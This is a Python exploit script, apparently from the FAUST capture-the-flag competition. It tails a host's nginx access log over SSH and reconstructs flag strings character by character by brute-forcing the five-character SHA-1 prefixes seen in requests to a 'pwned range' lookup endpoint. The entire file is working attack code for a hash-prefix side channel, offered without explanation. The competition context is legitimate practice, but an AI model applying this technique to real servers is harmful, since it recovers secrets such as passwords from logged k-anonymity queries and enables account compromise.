import subprocess
import hashlib
import sys
from collections import defaultdict, deque
import re

host = sys.argv[1]

tailf = subprocess.Popen(["ssh", host, "tail", "-f", "/var/log/nginx/access.log"], stdout=subprocess.PIPE)



tree = defaultdict(set)

def expand(prefix):
    for nextchar in range(128):
        x = prefix + bytes([nextchar])
        h = hashlib.sha1(x).hexdigest()[:5].upper().encode()
        tree[h].add(x)


expand(b"")

flagre = re.compile(b"FAUST_[a-zA-Z0-9./+=]{32}")

def handle(h):
    if h in tree:
        for val in tree[h]:
            print("?", val.decode(), file=sys.stderr)
            if flagre.match(val):
                print(val.decode())
            else:
                expand(val)

print(tree)

q = deque([], 20)

search = re.compile(b"GET /responsivesecurity/pwned/range/([A-F0-9]*)")
for line in tailf.stdout:
    m = search.search(line)
    if m:
        if len(m.group(1)) == 5:
            q.append(m.group(1))
            for e in q:
                handle(e)


